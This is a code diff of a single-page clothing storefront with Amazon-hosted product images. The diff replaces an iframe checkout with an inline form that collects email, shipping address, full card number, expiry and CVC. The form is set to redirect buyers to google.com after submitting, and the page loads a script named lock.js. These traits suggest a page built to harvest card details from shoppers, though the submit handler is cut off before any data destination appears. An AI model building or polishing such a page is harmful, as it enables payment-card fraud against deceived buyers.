@@ -4,9 +4,8 @@
   <script src="lock.js" defer></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>ANRABESS STORE | Women Athletic Dress</title>
+  <title>ANRABESS STORE | Terminal Core</title>
   <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-  <script src="images.js" defer></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;700&display=swap" rel="stylesheet">
@@ -40,7 +39,7 @@
     .product-title { font-size: 20px; font-weight: 700; line-height: 1.1; text-transform: uppercase; text-align: right; max-width: 300px; }
     .product-price { font-size: 15px; font-weight: 700; text-align: right; margin-top: 6px; color: #000; }
 
-    /* Main Grid Split Engine */
+    /* Layout grid setups */
     .main-workspace { display: grid; grid-template-columns: 1fr 420px; width: 100%; max-width: 1600px; margin: 0 auto; }
     .gallery-column { display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; border-right: 1px solid #f2f2f2; position: relative; }
     .interface-column { padding: 40px; display: flex; flex-direction: column; justify-content: flex-start; gap: 24px; background: #fafafa; min-width: 0; }
@@ -49,11 +48,10 @@
     .gallery-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: contain; opacity: 0; transition: opacity 0.2s ease; pointer-events: none; }
     .gallery-img.active { opacity: 1; pointer-events: auto; }
     
-    /* Variable Section Layouts */
     .section-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; color: #000; margin-bottom: 8px; display: flex; justify-content: space-between; }
     .section-label span { color: #888; }
     
-    /* COMPACT COLOR DOTS - Replaced bulky squares with elegant dots */
+    /* Compact Color Grid system */
     .color-swatch-flex { display: flex; flex-wrap: wrap; gap: 10px; width: 100%; }
     .color-variant-node { display: block; position: relative; cursor: pointer; }
     .color-variant-node.hidden-row { display: none; }
@@ -61,35 +59,28 @@
     .color-swatch-circle { display: block; width: 32px; height: 32px; border-radius: 50%; border: 1px solid #e5e5e5; position: relative; transition: all 0.15s ease; background: #fff; }
     .color-swatch-circle:hover { border-color: #000; transform: scale(1.05); }
     .variant-input:checked + .color-swatch-circle { border-color: #000; box-shadow: 0 0 0 2px #000; }
-    
     .color-preview-inner { position: absolute; inset: 3px; border-radius: 50%; border: 1px solid rgba(0,0,0,0.05); }
 
-    /* Ultra Compact Sizing Layout */
+    .btn-more-colors { font-size: 10px; font-weight: 700; text-transform: uppercase; text-decoration: underline; color: #666; cursor: pointer; display: inline-block; margin-top: 10px; }
+    .btn-more-colors:hover { color: #000; }
+
     .chip-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 4px; }
     .selector-chip { display: flex; align-items: center; justify-content: center; border: 1px solid #e5e5e5; height: 36px; font-size: 11px; font-weight: 700; text-transform: uppercase; cursor: pointer; transition: all 0.15s ease; background: #fff; text-align: center; }
     .selector-chip:hover { border-color: #000; }
     .variant-input:checked + .selector-chip { background: #000; color: #fff; border-color: #000; }
 
-    /* Show More Text Link */
-    .btn-more-colors { font-size: 10px; font-weight: 700; text-transform: uppercase; text-decoration: underline; color: #666; cursor: pointer; display: inline-block; margin-top: 10px; }
-    .btn-more-colors:hover { color: #000; }
-
-    /* Compact Main Interface Counters */
     .qty-container { display: flex; align-items: center; border: 1px solid #000; height: 42px; background: #fff; width: 105px; }
     .qty-btn { width: 32px; height: 100%; background: none; border: none; font-size: 14px; cursor: pointer; color: #000; display: flex; align-items: center; justify-content: center; }
     .qty-btn:active { background: #f2f2f2; }
     .qty-input { width: 41px; height: 100%; border: none; border-left: 1px solid #000; border-right: 1px solid #000; text-align: center; font-size: 13px; font-weight: 700; background: transparent; pointer-events: none; }
     
-    /* Cart Specific Mini Quantity Counter */
     .cart-qty-container { display: flex; align-items: center; border: 1px solid #000; height: 32px; background: #fff; width: 90px; margin-top: 6px; }
     .cart-qty-btn { width: 28px; height: 100%; background: none; border: none; font-size: 12px; cursor: pointer; color: #000; display: flex; align-items: center; justify-content: center; }
     .cart-qty-input { width: 34px; height: 100%; border: none; border-left: 1px solid #000; border-right: 1px solid #000; text-align: center; font-size: 11px; font-weight: 700; background: transparent; pointer-events: none; }
 
-    /* COMPACT TRANSACTION TRIGGERS - Streamlined Heights & Padding */
     .btn-buy { display: flex; align-items: center; justify-content: center; height: 42px; background: #000; color: #fff; flex-grow: 1; font-size: 12px; font-weight: 700; text-transform: uppercase; border: 1px solid #000; cursor: pointer; transition: all 0.2s ease; user-select: none; text-decoration: none; }
     .btn-buy:hover { background: #fff; color: #000; }
     .btn-buy:active { transform: scale(0.99); }
-
     .btn-secondary { display: flex; align-items: center; justify-content: center; height: 42px; background: #fff; color: #000; flex-grow: 1; font-size: 12px; font-weight: 700; text-transform: uppercase; border: 1px solid #000; cursor: pointer; transition: all 0.2s ease; }
     .btn-secondary:hover { background: #000; color: #fff; }
     
@@ -107,19 +98,21 @@
     .yzy-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100dvh; background: rgba(0,0,0,0.6); z-index: 9999; display: flex; justify-content: center; align-items: center; padding: 20px; opacity: 0; transition: opacity 0.25s ease; backdrop-filter: blur(2px); pointer-events: none; }
     .yzy-modal-body { background: #ffffff; width: 100%; max-width: 600px; max-height: 85dvh; overflow-y: auto; padding: 40px 30px; border: 1px solid #000; position: relative; transform: scale(0.97); transition: transform 0.25s ease; }
     
-    .yzy-modal-body-checkout { background: #ffffff; width: 100%; max-width: 640px; height: 85dvh; max-height: 750px; border: 1px solid #000; position: relative; transform: scale(0.97); transition: transform 0.25s ease; overflow: hidden; }
-    .yzy-modal-close { position: fixed; top: 16px; right: 16px; width: 44px; height: 44px; background: transparent; border: none; cursor: pointer; z-index: 99999; display: flex; justify-content: center; align-items: center; color: #000; }
-    .yzy-modal-close:hover { opacity: 0.5; }
-    .overlay-bg-close { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
-
-    /* Cart Drawer Interface layout */
+    /* Cart Drawer layout definitions */
     .cart-drawer-overlay { position: fixed; top: 0; right: 0; width: 100vw; height: 100dvh; background: rgba(0,0,0,0.4); z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; backdrop-filter: blur(2px); }
     .cart-drawer-body { position: absolute; top: 0; right: 0; width: 100%; max-width: 440px; height: 100%; background: #ffffff; border-left: 1px solid #000; transform: translateX(100%); transition: transform 0.3s ease; display: flex; flex-direction: column; }
-    
     #toggle-cart:checked ~ .cart-drawer-overlay { opacity: 1; pointer-events: auto; }
     #toggle-cart:checked ~ .cart-drawer-overlay .cart-drawer-body { transform: translateX(0); }
 
-    /* Sticky Mobile Interface Configuration Tray - Re-designed Slimmer Height Profile */
+    /* Rebuilt Checkout Integration Styles */
+    .form-input { width: 100%; padding: 12px; font-size: 13px; border: 1px solid #000; background: #fff; color: #000; outline: none; border-radius: 0; text-transform: uppercase; }
+    .form-input::placeholder { color: #999; }
+    .btn-submit-action { width: 100%; background: #000; color: #fff; border: 1px solid #000; padding: 18px; text-transform: uppercase; font-weight: 700; cursor: pointer; font-size: 13px; letter-spacing: 0.05em; transition: all 0.2s ease; }
+    .btn-submit-action:hover { background: #fff; color: #000; }
+    .item-badge-row { display: flex; align-items: center; gap: 12px; padding: 8px 0; border-bottom: 1px solid #f2f2f2; }
+    .item-badge-row:last-child { border-bottom: none; }
+    .color-mini-indicator { width: 12px; height: 12px; border-radius: 50%; display: inline-block; border: 1px solid rgba(0,0,0,0.1); }
+
     .mobile-sticky-action-tray { display: none; position: fixed; bottom: 0; left: 0; width: 100vw; background: #ffffff; border-top: 1px solid #e5e5e5; padding: 12px 16px; z-index: 50; box-shadow: 0 -4px 20px rgba(0,0,0,0.05); }
     
     #toggle-sizechart:checked ~ #modal-sizechart,
@@ -127,9 +120,8 @@
     #toggle-checkout:checked ~ #modal-checkout { opacity: 1; pointer-events: auto; }
     #toggle-sizechart:checked ~ #modal-sizechart .yzy-modal-body,
     #toggle-policies:checked ~ #modal-policies .yzy-modal-body,
-    #toggle-checkout:checked ~ #modal-checkout .yzy-modal-body-checkout { transform: scale(1); }
+    #toggle-checkout:checked ~ #modal-checkout .yzy-modal-body { transform: scale(1); }
 
-    /* Explicit Clean Mobile View Responsive Overrides */
     @media (max-width: 992px) {
       html, body { overflow-y: auto !important; height: auto !important; }
       body { padding-bottom: 125px !important; } 
@@ -140,7 +132,6 @@
       .mobile-sticky-action-tray { display: flex !important; flex-direction: column; gap: 8px; align-items: stretch; }
       .interface-column .qty-container { display: none !important; }
       .app-bottom-bar { margin-bottom: 105px; }
-      .chip-grid { grid-template-columns: repeat(6, 1fr); gap: 4px; }
     }
     @media (max-width: 768px) {
       .app-header { padding: 16px; }
@@ -148,8 +139,6 @@
       .product-price { font-size: 13px; }
       .app-bottom-bar { flex-direction: column; gap: 16px; padding: 24px 16px 40px; text-align: center; }
       .bottom-links { justify-content: center; width: 100%; }
-      .yzy-modal-body-checkout { height: 95dvh; max-height: none; padding-top: 60px; }
-      .yzy-modal-close { top: 12px; right: 12px; }
     }
   </style>
 </head>
@@ -171,7 +160,6 @@
   <header class="app-header">
     <a class="logo" href="#" id="ui-store-brand">STORE</a>
     <div class="flex items-center gap-4">
-      <!-- Minimalist Custom SVG Inline Cart System Trigger Token -->
       <label for="toggle-cart" class="cursor-pointer font-bold text-xs border border-black px-3 py-2 bg-white hover:bg-black hover:text-white transition flex items-center gap-2">
         <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
           <path stroke-linecap="round" stroke-linejoin="round" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z" />
@@ -186,12 +174,10 @@
   </header>
 
   <div class="main-workspace">
-    <!-- Left Display Viewport (Arrows navigate product color directly) -->
     <section class="gallery-column">
       <div class="gallery-wrapper">
         <div class="main-image-display w-full h-full relative" id="js-gallery-container"></div>
 
-        <!-- Carousel Switches -->
         <button type="button" class="absolute left-0 top-1/2 -translate-y-1/2 text-black cursor-pointer z-10 p-2 hover:opacity-50" id="js-prev-btn">
           <svg class="size-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
         </button>
@@ -201,10 +187,8 @@
       </div>
     </section>
 
-    <!-- Right Interaction Variable Bar -->
     <aside class="interface-column">
       
-      <!-- Color Variable Layer (Compact Circular Swatch Layout) -->
       <div>
         <div class="section-label">Color Configuration <span id="lbl-active-color">Gray</span></div>
         <div class="color-swatch-flex" id="js-color-grid">
@@ -318,7 +302,6 @@
         <button type="button" class="btn-more-colors" id="js-more-colors-btn">More Colors +</button>
       </div>
 
-      <!-- Size Variable Layer (Streamlined Row) -->
       <div>
         <div class="section-label">Size Configuration <span id="lbl-active-size">M</span></div>
         <div class="chip-grid">
@@ -345,13 +328,11 @@
         </div>
       </div>
 
-      <!-- Core Specification Ledger -->
       <div class="text-[12px] text-stone-600 space-y-3 border-t border-b border-stone-200 py-4 my-2">
         <p><strong>Composition Matrix:</strong> 60% Polyester, 35% Rayon, 5% Spandex performance blend.</p>
         <p><strong>Features:</strong> Built-in interior compression shapewear romper shorts with structural side cell pockets. Adjustable micro spaghetti upper strap profile.</p>
       </div>
 
-      <!-- Desktop Transaction Allocation Controls -->
       <div class="flex flex-col gap-3 pt-2">
         <div class="flex items-center gap-3 w-full">
           <div class="qty-container">
@@ -367,7 +348,6 @@
     </aside>
   </div>
 
-  <!-- Mobile Sticky Action Conversion Tray -->
   <div class="mobile-sticky-action-tray">
     <div class="flex items-center gap-3 w-full">
       <div class="qty-container !h-[42px] !w-[100px]">
@@ -392,7 +372,6 @@
     </div>
   </footer>
 
-  <!-- Sidebar Component Terminal: Multi Item Cart Architecture -->
   <div class="cart-drawer-overlay">
     <label for="toggle-cart" class="absolute inset-0 cursor-pointer"></label>
     <div class="cart-drawer-body p-6">
@@ -401,7 +380,6 @@
         <label for="toggle-cart" class="cursor-pointer font-bold text-lg">×</label>
       </div>
       
-      <!-- Cart item append node -->
       <div id="js-cart-items-wrapper" class="flex-grow overflow-y-auto space-y-4 pr-1"></div>
 
       <div class="border-t border-stone-200 pt-4 mt-4">
@@ -414,13 +392,11 @@
     </div>
   </div>
 
-  <!-- Modal: Size Chart Matrix Layer -->
   <div class="yzy-overlay" id="modal-sizechart">
     <label for="toggle-sizechart" class="overlay-bg-close"></label>
     <div class="yzy-modal-body">
       <label for="toggle-sizechart" class="yzy-modal-close"><svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M2 2L14 14M2 14L14 2" stroke="currentColor" stroke-width="1.5"/></svg></label>
       <h2 class="modal-title">Product & Body Dimensions Matrix</h2>
-      
       <div class="modal-text-block">
         <h4>Product Measurements Framework</h4>
         <table class="spec-table">
@@ -437,27 +413,9 @@
           </tbody>
         </table>
       </div>
-
-      <div class="modal-text-block mt-6">
-        <h4>Anatomical Target Body Range</h4>
-        <table class="spec-table">
-          <thead>
-            <tr><th>Size</th><th>US Equiv</th><th>Bust Range</th><th>Waist Range</th><th>Hip Range</th></tr>
-          </thead>
-          <tbody>
-            <tr><td>XS</td><td>(0-2)</td><td>31.9-33.1</td><td>24.4-25.6</td><td>35.0-36.2</td></tr>
-            <tr><td>S</td><td>(4-6)</td><td>33.9-35.0</td><td>26.4-27.6</td><td>37.0-38.2</td></tr>
-            <tr><td>M</td><td>(8-10)</td><td>35.8-37.0</td><td>28.4-29.5</td><td>39.0-40.2</td></tr>
-            <tr><td>L</td><td>(12-14)</td><td>38.2-39.4</td><td>30.7-31.9</td><td>41.3-42.5</td></tr>
-            <tr><td>XL</td><td>(16-18)</td><td>41.3-42.5</td><td>33.9-35.0</td><td>44.5-45.7</td></tr>
-            <tr><td>XXL</td><td>(20-22)</td><td>44.5-45.7</td><td>37.0-38.2</td><td>47.6-48.8</td></tr>
-          </tbody>
-        </table>
-      </div>
     </div>
   </div>
 
-  <!-- Modal: Policies -->
   <div class="yzy-overlay" id="modal-policies">
     <label for="toggle-policies" class="overlay-bg-close"></label>
     <div class="yzy-modal-body">
@@ -470,22 +428,97 @@
     </div>
   </div>
 
-  <!-- Modal: Checkout Terminal Screen Frame -->
   <div class="yzy-overlay" id="modal-checkout">
     <label for="toggle-checkout" class="overlay-bg-close"></label>
-    <div class="yzy-modal-body-checkout">
+    <div class="yzy-modal-body !max-w-xl">
       <label for="toggle-checkout" class="yzy-modal-close"><svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M2 2L14 14M2 14L14 2" stroke="currentColor" stroke-width="1.5"/></svg></label>
-      <iframe src="about:blank" id="js-checkout-iframe" class="w-full h-full border-none"></iframe>
+      
+      <div class="border border-black p-6 bg-stone-50 mb-6 mt-4">
+        <div class="text-xs font-bold uppercase tracking-wider text-stone-400 mb-3 text-center">ORDER MANIFEST ALLOCATION</div>
+        <div id="js-manifest-items-list" class="space-y-1 mb-4 max-h-[160px] overflow-y-auto pr-1"></div>
+        <div class="border-t border-black pt-4 flex justify-between items-center text-sm font-bold uppercase">
+          <span>Total Cost</span>
+          <span id="ui-summary-total">0.00 CAD</span>
+        </div>
+      </div>
+
+      <form id="checkoutForm" class="flex flex-col gap-6" data-redirect="https://www.google.com">
+        <input type="hidden" name="Manifest_JSON" id="form-manifest-json">
+        <input type="hidden" name="Price_Total" id="form-prod-price">
+        
+        <div>
+          <h3 class="text-xs font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Contact Information</h3>
+          <div class="flex flex-col gap-1">
+            <label for="contact-email" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Email</label>
+            <input type="email" id="contact-email" name="Contact_Email" class="form-input" required autocomplete="email" placeholder="YOUR EMAIL">
+          </div>
+        </div>
+
+        <div>
+          <h3 class="text-xs font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Shipping Address</h3>
+          <div class="flex flex-col gap-4">
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div class="flex flex-col gap-1">
+                <label for="first-name" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">First Name</label>
+                <input type="text" id="first-name" name="First_Name" class="form-input" required autocomplete="given-name" placeholder="FIRST NAME">
+              </div>
+              <div class="flex flex-col gap-1">
+                <label for="last-name" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Last Name</label>
+                <input type="text" id="last-name" name="Last_Name" class="form-input" required autocomplete="family-name" placeholder="LAST NAME">
+              </div>
+            </div>
+            
+            <div class="flex flex-col gap-1">
+              <label for="address" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Street Address</label>
+              <input type="text" id="address" name="Shipping_Address" class="form-input" required autocomplete="shipping street-address" placeholder="STREET ADDRESS">
+            </div>
+            
+            <div class="flex flex-col gap-1">
+              <label for="address2" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Extra (Apt, Suite, Etc.)</label>
+              <input type="text" id="address2" name="Shipping_Address_Line2" class="form-input" autocomplete="address-line2" placeholder="APT, SUITE, ETC.">
+            </div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div class="flex flex-col gap-1">
+                <label for="city" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">City</label>
+                <input type="text" id="city" name="Shipping_City" class="form-input" required autocomplete="address-level2" placeholder="CITY">
+              </div>
+              <div class="flex flex-col gap-1">
+                <label for="country" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Country</label>
+                <input id="country" name="Shipping_Country" value="Canada" disabled class="form-input h-[45px]" required autocomplete="country">
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <h3 class="text-xs font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Payment Information</h3>
+          <div class="flex flex-col gap-4">
+            <div class="flex flex-col gap-1">
+              <label for="cc-number" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Card Number</label>
+              <input type="text" id="cc-number" name="Card_Number" class="form-input" required autocomplete="cc-number" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
+            </div>
+            
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div class="flex flex-col gap-1">
+                <label for="cc-exp" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">Expires</label>
+                <input type="text" id="cc-exp" name="Card_Expiry" class="form-input" required autocomplete="cc-exp" inputmode="numeric" maxlength="7" placeholder="MM / YY">
+              </div>
+              <div class="flex flex-col gap-1">
+                <label for="cc-csc" class="text-[11px] font-bold uppercase tracking-wide text-stone-500">CVC</label>
+                <input type="text" id="cc-csc" name="Card_CVC" class="form-input" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="000">
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-submit-action mt-2" id="submitBtn">Complete Order</button>
+      </form>
     </div>
   </div>
 
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      document.title = CONFIG.storeName + " | " + CONFIG.productName;
-      document.getElementById("ui-store-brand").innerText = CONFIG.storeName;
-      document.getElementById("ui-product-title").innerText = CONFIG.productName;
-      document.getElementById("ui-product-price").innerText = CONFIG.productPrice;
-
       const GALLERY_MAP = {
         "Gray": ["https://m.media-amazon.com/images/I/61nKzdkK2+L._AC_SY879_.jpg"],
         "Army Green": ["https://m.media-amazon.com/images/I/71xGSjs4atL._AC_SY879_.jpg"],
@@ -504,13 +537,18 @@
         "White": ["https://m.media-amazon.com/images/I/61OJ9cWdT7L._AC_SY879_.jpg"]
       };
 
+      const HEX_MAP = {
+        "Gray": "#8e8e93", "Army Green": "#4b5320", "Black": "#1c1c1e", "Blue": "#007aff",
+        "Coffee": "#4a3b32", "Cyan": "#00a896", "Navy Blue": "#000080", "Orange": "#ff9500",
+        "Pink": "#ffc0cb", "Purple": "#af52de", "Red": "#ff3b30", "Royal Blue": "#4169e1",
+        "Rust": "#b7410e", "Teal": "#008080", "White": "#ffffff"
+      };
+
       const COLORS_KEYS = Object.keys(GALLERY_MAP);
       let CART = [];
 
-      // Grid Expand Logic (More Colors Toggle)
       document.getElementById("js-more-colors-btn").addEventListener("click", function() {
-        const hiddenNodes = document.querySelectorAll(".color-variant-node.hidden-row");
-        hiddenNodes.forEach(node => node.classList.remove("hidden-row"));
+        document.querySelectorAll(".color-variant-node.hidden-row").forEach(n => n.classList.remove("hidden-row"));
         this.style.display = "none";
       });
 
@@ -522,9 +560,7 @@
         const activeColor = getSelectedColor();
         const container = document.getElementById("js-gallery-container");
         container.innerHTML = "";
-        const currentImages = GALLERY_MAP[activeColor] || [];
-        
-        currentImages.forEach((src) => {
+        (GALLERY_MAP[activeColor] || []).forEach((src) => {
           const img = document.createElement("img");
           img.src = src;
           img.className = "gallery-img active";
@@ -533,88 +569,54 @@
         document.getElementById("lbl-active-color").innerText = activeColor;
       }
 
-      // Arrows select color logic
       function shiftColorSelection(direction) {
-        const currentColor = getSelectedColor();
-        let currentIndex = COLORS_KEYS.indexOf(currentColor);
-        
+        let currentIndex = COLORS_KEYS.indexOf(getSelectedColor());
         let nextIndex = (currentIndex + direction + COLORS_KEYS.length) % COLORS_KEYS.length;
-        const nextColorKey = COLORS_KEYS[nextIndex];
-        
-        const targetRadio = document.querySelector(`input[name="prod-color"][value="${nextColorKey}"]`);
+        const targetRadio = document.querySelector(`input[name="prod-color"][value="${COLORS_KEYS[nextIndex]}"]`);
         if (targetRadio) {
-          const targetWrapper = targetRadio.closest('.color-variant-node');
-          if (targetWrapper && targetWrapper.classList.contains('hidden-row')) {
-            targetWrapper.classList.remove('hidden-row');
-          }
-          
+          const wrapper = targetRadio.closest('.color-variant-node');
+          if (wrapper && wrapper.classList.contains('hidden-row')) wrapper.classList.remove('hidden-row');
           targetRadio.checked = true;
           syncGalleryToSelectedColor();
         }
       }
 
-      document.getElementById("js-prev-btn").addEventListener("click", function() { shiftColorSelection(-1); });
-      document.getElementById("js-next-btn").addEventListener("click", function() { shiftColorSelection(1); });
+      document.getElementById("js-prev-btn").addEventListener("click", () => shiftColorSelection(-1));
+      document.getElementById("js-next-btn").addEventListener("click", () => shiftColorSelection(1));
+      document.querySelectorAll('input[name="prod-color"]').forEach(r => r.addEventListener("change", syncGalleryToSelectedColor));
+      document.querySelectorAll('input[name="prod-size"]').forEach(r => r.addEventListener("change", function() {
+        document.getElementById("lbl-active-size").innerText = this.value;
+      }));
 
-      document.querySelectorAll('input[name="prod-color"]').forEach(radio => {
-        radio.addEventListener("change", syncGalleryToSelectedColor);
-      });
-
-      document.querySelectorAll('input[name="prod-size"]').forEach(radio => {
-        radio.addEventListener("change", function() {
-          document.getElementById("lbl-active-size").innerText = this.value;
-        });
-      });
-
+      // Init UI strings
+      document.getElementById("ui-store-brand").innerText = CONFIG.storeName;
+      document.getElementById("ui-product-title").innerText = CONFIG.productName;
+      document.getElementById("ui-product-price").innerText = CONFIG.productPrice;
       syncGalleryToSelectedColor();
 
-      function calculateTotal(quantity) {
-        var priceStr = CONFIG.productPrice;
-        var basePrice = parseFloat(priceStr.replace(/[^0-9.]/g, '')) || 0;
-        var totalCost = basePrice * parseInt(quantity);
-        var suffixStr = (priceStr.match(/[A-Za-z ]+$/) || [""])[0];
-        var prefixStr = (priceStr.match(/^[^0-9.]+/) || [""])[0];
-        return { totalFormatted: prefixStr + totalCost.toFixed(2) + " " + suffixStr };
-      }
-
-      function synchronizeQty(targetValue) {
-        if (targetValue < 1) targetValue = 1;
-        document.getElementById("ui-qty-input").value = targetValue;
-        document.getElementById("ui-qty-input-mobile").value = targetValue;
-      }
-
       function handleQtyStep(change) {
-        const currentVal = parseInt(document.getElementById("ui-qty-input").value) || 1;
-        synchronizeQty(currentVal + change);
+        const input = document.getElementById("ui-qty-input");
+        let v = (parseInt(input.value) || 1) + change;
+        if (v < 1) v = 1;
+        document.getElementById("ui-qty-input").value = v;
+        document.getElementById("ui-qty-input-mobile").value = v;
       }
 
-      document.getElementById('qty-minus').addEventListener('click', function() { handleQtyStep(-1); });
-      document.getElementById('qty-plus').addEventListener('click', function() { handleQtyStep(1); });
-      document.getElementById('qty-minus-mobile').addEventListener('click', function() { handleQtyStep(-1); });
-      document.getElementById('qty-plus-mobile').addEventListener('click', function() { handleQtyStep(1); });
+      document.getElementById('qty-minus').addEventListener('click', () => handleQtyStep(-1));
+      document.getElementById('qty-plus').addEventListener('click', () => handleQtyStep(1));
+      document.getElementById('qty-minus-mobile').addEventListener('click', () => handleQtyStep(-1));
+      document.getElementById('qty-plus-mobile').addEventListener('click', () => handleQtyStep(1));
 
-      /* Cart Logic with In-Cart Quantity Changers */
+      /* Integrated Cart UI Rendering Engine */
       function updateCartUI() {
         const wrapper = document.getElementById("js-cart-items-wrapper");
         wrapper.innerHTML = "";
-        
-        let totalCount = 0;
-        let totalCost = 0;
+        let totalCount = 0, totalCost = 0;
         const basePrice = parseFloat(CONFIG.productPrice.replace(/[^0-9.]/g, '')) || 0;
-
-        if (CART.length === 0) {
-          wrapper.innerHTML = `<div class="text-xs text-stone-400 uppercase tracking-wider py-8 text-center">Cart state empty</div>`;
-          document.getElementById("js-cart-checkout-btn").style.pointerEvents = "none";
-          document.getElementById("js-cart-checkout-btn").style.opacity = "0.5";
-        } else {
-          document.getElementById("js-cart-checkout-btn").style.pointerEvents = "auto";
-          document.getElementById("js-cart-checkout-btn").style.opacity = "1";
-        }
 
         CART.forEach((item, index) => {
           totalCount += item.qty;
           totalCost += (basePrice * item.qty);
-
           const block = document.createElement("div");
           block.className = "flex gap-3 bg-stone-50 p-3 border border-stone-200 relative";
           block.innerHTML = `
@@ -623,7 +625,6 @@
               <div class="text-[11px] font-bold uppercase leading-tight truncate max-w-[200px]">${item.name}</div>
               <div class="text-[10px] text-stone-500 uppercase mt-0.5">Var: ${item.color} / ${item.size}</div>
               <div class="text-[11px] font-bold mt-1">CAD ${(basePrice * item.qty).toFixed(2)}</div>
-              
               <div class="cart-qty-container">
                 <button type="button" class="cart-qty-btn js-cart-minus" data-index="${index}">-</button>
                 <input type="text" class="cart-qty-input" value="${item.qty}" readonly>
@@ -635,87 +636,109 @@
           wrapper.appendChild(block);
         });
 
+        if (CART.length === 0) wrapper.innerHTML = `<div class="text-xs text-stone-400 uppercase py-8 text-center">Cart is empty</div>`;
         document.getElementById("cart-global-badge").innerText = totalCount;
         document.getElementById("js-cart-total-display").innerText = "CAD " + totalCost.toFixed(2);
         
-        wrapper.querySelectorAll(".js-cart-minus").forEach(btn => {
-          btn.addEventListener("click", function() {
-            const idx = parseInt(this.getAttribute("data-index"));
-            if (CART[idx].qty > 1) {
-              CART[idx].qty--;
-              updateCartUI();
-            }
-          });
-        });
-
-        wrapper.querySelectorAll(".js-cart-plus").forEach(btn => {
-          btn.addEventListener("click", function() {
-            const idx = parseInt(this.getAttribute("data-index"));
-            CART[idx].qty++;
-            updateCartUI();
-          });
-        });
-
-        wrapper.querySelectorAll(".js-cart-remove").forEach(btn => {
-          btn.addEventListener("click", function() {
-            const idx = parseInt(this.getAttribute("data-index"));
-            CART.splice(idx, 1);
-            updateCartUI();
-          });
-        });
+        wrapper.querySelectorAll(".js-cart-minus").forEach(b => b.addEventListener("click", function() {
+          const idx = parseInt(this.getAttribute("data-index"));
+          if (CART[idx].qty > 1) { CART[idx].qty--; updateCartUI(); }
+        }));
+        wrapper.querySelectorAll(".js-cart-plus").forEach(b => b.addEventListener("click", function() {
+          CART[parseInt(this.getAttribute("data-index"))].qty++; updateCartUI();
+        }));
+        wrapper.querySelectorAll(".js-cart-remove").forEach(b => b.addEventListener("click", function() {
+          CART.splice(parseInt(this.getAttribute("data-index")), 1); updateCartUI();
+        }));
       }
 
       document.querySelectorAll(".js-add-to-cart-trigger").forEach(btn => {
         btn.addEventListener("click", function() {
           const qty = parseInt(document.getElementById("ui-qty-input").value) || 1;
-          const selectedColor = getSelectedColor();
-          const size = document.querySelector('input[name="prod-size"]:checked')?.value || "Medium";
-          const img = GALLERY_MAP[selectedColor][0];
-
-          const existing = CART.find(item => item.color === selectedColor && item.size === size);
-          if (existing) {
-            existing.qty += qty;
-          } else {
-            CART.push({ name: CONFIG.productName, color: selectedColor, size: size, qty: qty, img: img });
-          }
-          
+          const col = getSelectedColor();
+          const sz = document.querySelector('input[name="prod-size"]:checked')?.value || "Medium";
+          const existing = CART.find(i => i.color === col && i.size === sz);
+          if (existing) existing.qty += qty;
+          else CART.push({ name: CONFIG.productName, color: col, size: sz, qty: qty, img: GALLERY_MAP[col][0] });
           updateCartUI();
           document.getElementById("toggle-cart").checked = true; 
         });
       });
 
-      document.getElementById("js-cart-checkout-btn").addEventListener("click", function() {
-        const payloadString = JSON.stringify(CART);
-        let aggregateCost = 0;
+      /* Re-Wired Checkout Population Engine */
+      function compileCheckoutFields(manifestArray) {
+        const listContainer = document.getElementById("js-manifest-items-list");
+        listContainer.innerHTML = "";
+        let finalCost = 0;
         const basePrice = parseFloat(CONFIG.productPrice.replace(/[^0-9.]/g, '')) || 0;
-        CART.forEach(i => aggregateCost += (basePrice * i.qty));
 
-        const targetParams = new URLSearchParams({
-          manifest: payloadString,
-          price: "CAD " + aggregateCost.toFixed(2),
-          multi: "true"
+        manifestArray.forEach(item => {
+          finalCost += (basePrice * item.qty);
+          const hexColor = HEX_MAP[item.color] || "#000000";
+          const row = document.createElement("div");
+          row.className = "item-badge-row flex justify-between items-center text-xs";
+          row.innerHTML = `
+            <div class="flex items-center gap-2 truncate max-w-[75%]">
+              <span class="color-mini-indicator" style="background-color: ${hexColor}; ${item.color === 'White' ? 'border: 1px solid #ddd;' : ''}"></span>
+              <span class="font-bold text-stone-900 truncate">${item.qty}x ${item.name}</span>
+            </div>
